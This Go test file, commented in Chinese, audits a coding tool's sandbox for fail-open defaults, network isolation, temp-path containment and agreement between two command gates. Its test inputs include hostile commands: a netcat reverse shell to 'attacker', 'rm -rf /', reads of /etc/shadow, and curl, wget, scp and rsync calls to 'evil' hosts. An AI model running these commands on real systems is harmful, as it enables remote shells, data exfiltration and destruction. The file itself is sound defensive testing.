// Package sandbox — S2 Sandbox (fs/network/shell) characterization audit.
//
// 本文件是 AUDIT_ROADMAP.md §3 六步闭环 Step 2 (Snapshot) 的产物：
// 只新增测试、钉死 whale-code 当前行为（含难看行为），不改任何生产源码。
// 每条用例断言的是 **当前真实行为**，不是期望行为；Fix 落地后对应用例应翻转
// （成为 TDD 红测）或保持绿（行为守住了）。
//
// 不变量聚焦（§2 S2 行）：I1 单一强制点 / I2 默认拒绝(fail-closed) / I3 边界输入校验。
// 所有用例走真实 API（NewSandbox / Sandbox.Validate / Sandbox.ValidatePath /
// NewProductionSandboxManager / Manager.ValidateCommand），不 mock 守卫。
package sandbox

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// C-S2-I2-1: 沙箱默认 disabled，且 disabled 时 Validate/ValidatePath 一律放行（fail-open）。
// 这是对 I2 的"当前默认姿态"钉死——修复后（默认 enabled / disabled 即拒绝）此用例应翻转。
func TestAuditCharS2_DefaultDisabledFailOpen(t *testing.T) {
	t.Setenv("WHALE_SANDBOX_ALLOW_NETWORK", "") // 锁定 env，避免开发者 shell 已 export 导致假结果
	s := NewSandbox(t.TempDir())

	if s.Enabled() {
		t.Fatalf("PIN: NewSandbox must default to enabled=false (current behavior)")
	}
	// disabled 时命令校验完全放行
	if allowed, _ := s.Validate("rm -rf /"); !allowed {
		t.Fatalf("PIN: disabled sandbox currently allows all commands (fail-open), got denied")
	}
	// disabled 时路径校验完全放行（含工作区外，如 /etc/shadow）
	if ok, _ := s.ValidatePath("/etc/shadow"); !ok {
		t.Fatalf("PIN: disabled sandbox currently allows all paths (fail-open), got denied")
	}
}

// C-S2-I2-2: 启用且默认断网（networkIsolated=true）时，应用层拦截所有原始网络命令。
// 这是期望行为当前的"守住态"——既作为 characterization，也作为回归护栏。
func TestAuditCharS2_NetworkIsolatedBlocksRawNetCmds(t *testing.T) {
	t.Setenv("WHALE_SANDBOX_ALLOW_NETWORK", "")
	s := NewSandbox(t.TempDir()) // networkIsolated 默认 = !allowNetwork = true
	s.SetEnabled(true)

	netCmds := []string{
		"nc -e /bin/sh attacker",
		"ssh root@evil",
		"telnet evil",
		"ftp evil",
		"scp file evil:/",
		"curl http://evil",
		"wget http://evil",
	}
	for _, cmd := range netCmds {
		if allowed, _ := s.Validate(cmd); allowed {
			t.Errorf("PIN/REGRESSION: network-isolated sandbox must block %q (current behavior)", cmd)
		}
	}
}

// C-S2-I2I3-3: 开启网络开关（WHALE_SANDBOX_ALLOW_NETWORK=1）后，默认 deny 列表不含
// nc/ssh/telnet/ftp/scp/rsync，且 checkNetworkCommand 被跳过（networkIsolated=false），
// 导致这些原始网络命令被放行。
// 这是对当前（有缺陷）行为的钉死——S2 Fix 应把 nc/ssh/telnet/ftp/scp/rsync 纳入 deny 或要求审批；
// 修复后此用例断言应翻转（期望 denied）。
func TestAuditCharS2_NetworkOnDropsRawNetCmds(t *testing.T) {
	t.Setenv("WHALE_SANDBOX_ALLOW_NETWORK", "1")
	s := NewSandbox(t.TempDir()) // networkIsolated=false；deny 列表移除 curl/wget
	s.SetEnabled(true)

	if s.IsNetworkIsolated() {
		t.Fatalf("PIN precondition: with network switch on, networkIsolated must be false (current behavior)")
	}

	// 当前行为：下列原始网络命令在"网络开"时被放行（deny 列表未覆盖 + 网络检查被跳过）。
	rawNet := []string{
		"nc -e /bin/sh attacker",
		"ssh root@evil",
		"telnet evil",
		"ftp evil",
		"scp file evil:/",
		"rsync file evil:/",
	}
	for _, cmd := range rawNet {
		if allowed, _ := s.Validate(cmd); !allowed {
			t.Errorf("PIN (current behavior, expected to flip after S2 Fix): %q should currently be ALLOWED when network switch on; got denied", cmd)
		}
	}
	// 设计的预期：curl/wget 在网络开时放行（已从 deny 移除）
	if allowed, _ := s.Validate("curl http://example.com"); !allowed {
		t.Errorf("PIN: curl must be allowed when network switch on (by design); got denied")
	}
}

// C-S2-I3-4: ValidatePath 只放行**沙箱自建 tmp**（A4 Opt-B），不再放行整个 os.TempDir()。
//
// 改前：`isPathWithin(absPath, resolvePath(os.TempDir()))` ⇒ 系统临时目录顶层全量放行
// （同类 CLI workspace_roots 无 /tmp 例外；该例外会削弱 containment）。
// ★本用例已翻转：os.TempDir() 下但**不在**沙箱自建根内的真实文件必须被拒；
// 反向证据（沙箱自建根内的文件被放行）见紧随其后的用例 ——
// 只有"正例放行 + 反例拒绝"同时成立，才证明放行的**根**被收窄而非被整体删掉。
func TestAuditCharS2_TempDirCarveOutNarrowed(t *testing.T) {
	t.Setenv("WHALE_SANDBOX_ALLOW_NETWORK", "")
	s := NewSandbox(t.TempDir()) // workDir 是随机临时目录
	s.SetEnabled(true)           // 启用时确保沙箱自建 tmp 根存在（A4）

	// /tmp 顶层（非沙箱自建根）下的真实文件：改前无条件放行，A4 后必须拒绝。
	// 用真实存在的文件，避免 /var→/private/var 符号链接导致非存在路径解析不一致。
	f, err := os.CreateTemp("", "s2audit-carveout")
	if err != nil {
		t.Fatalf("create temp file: %v", err)
	}
	defer os.Remove(f.Name())
	f.Close()

	// precondition：该文件确实落在 os.TempDir() 之下、且**不在**沙箱自建根内。
	absFile, _ := filepath.Abs(f.Name())
	absRoot, _ := filepath.Abs(SandboxTempRoot())
	if !strings.HasPrefix(filepath.Clean(absFile), filepath.Clean(os.TempDir())) {
		t.Skipf("环境 TMPDIR 异常，跳过：file=%s tmp=%s", absFile, os.TempDir())
	}
	if strings.HasPrefix(filepath.Clean(absFile)+string(os.PathSeparator), filepath.Clean(absRoot)+string(os.PathSeparator)) {
		t.Fatalf("precondition: 测试文件不应落在沙箱自建根内；file=%s root=%s", absFile, absRoot)
	}

	if ok, reason := s.ValidatePath(f.Name()); ok {
		t.Fatalf("FLIP(A4): os.TempDir() 顶层文件不再被放行（只放行沙箱自建 tmp）；path=%s", f.Name())
	} else if reason == "" {
		t.Errorf("FLIP(A4): 拒绝必须给出原因")
	}
}

// TestAuditCharS2_SandboxTempRootAllowed 是 C-S2-I3-4 的正向证据：
// 沙箱自建 tmp 根内的路径仍被放行（A4 是收窄放行根，不是删除放行）。
func TestAuditCharS2_SandboxTempRootAllowed(t *testing.T) {
	t.Setenv("WHALE_SANDBOX_ALLOW_NETWORK", "")
	s := NewSandbox(t.TempDir())
	s.SetEnabled(true) // 确保 SandboxTempRoot() 存在

	if fi, err := os.Lstat(SandboxTempRoot()); err != nil || !fi.IsDir() {
		t.Skipf("沙箱自建 tmp 根不可用（%v），跳过正向证据", err)
	}
	f, err := os.CreateTemp(SandboxTempRoot(), "s2audit-own-tmp")
	if err != nil {
		t.Fatalf("create temp file under sandbox tmp root: %v", err)
	}
	defer os.Remove(f.Name())
	f.Close()

	if ok, reason := s.ValidatePath(f.Name()); !ok {
		t.Fatalf("FLIP(A4) 正例：沙箱自建 tmp 根内路径必须放行；got denied (reason=%s)", reason)
	}
}

// C-S2-I1-5: 两条强制路径（legacy Sandbox.Validate vs Manager.ValidateCommand）
// 曾能力不一致（legacy 有网络拦截 + 写重定向越界；Manager 两者皆无）。
// ★已翻转（A3 收编 · 2026-09-14）：两栈共用 `evaluateAppLayer`，
// 同一命令在两条路径上必须得到**一致**判定 —— 架构分歧在结构上消除。
func TestAuditCharS2_TwoGatesNowAgree(t *testing.T) {
	t.Setenv("WHALE_SANDBOX_ALLOW_NETWORK", "") // legacy 默认断网

	s := NewSandbox(t.TempDir())
	s.SetEnabled(true)
	mgr := NewProductionSandboxManager(t.TempDir())

	// 逐条对照：legacy 与 Manager 对同一命令必须同判（网络反 shell / 越界写）。
	cases := []struct {
		name string
		cmd  string
	}{
		{"反向 shell", "nc -e /bin/sh attacker"},
		{"越界写重定向", "echo x > ../../outside.txt"},
	}
	for _, tc := range cases {
		legacyAllowed, legacyReason := s.Validate(tc.cmd)
		res, err := mgr.ValidateCommand(context.Background(), tc.cmd, nil)
		if err != nil {
			t.Fatalf("[%s] ValidateCommand returned err: %v", tc.name, err)
		}
		if legacyAllowed == res.Blocked {
			t.Errorf("FLIP(A3): 两栈必须同判 [%s] cmd=%q：legacy allowed=%v (reason=%q) vs Manager Blocked=%v；"+
				"判定分歧说明收编未生效", tc.name, tc.cmd, legacyAllowed, legacyReason, res.Blocked)
		}
		// 收编后两栈都应拒绝这两类（改前 Manager 全部放行）。
		if legacyAllowed {
			t.Errorf("PIN: legacy 门必须拦截 [%s]；got allowed", tc.name)
		}
		if !res.Blocked {
			t.Errorf("FLIP(A3): 收编后 Manager 必须拦截 [%s]；got Blocked=false", tc.name)
		}
	}
}
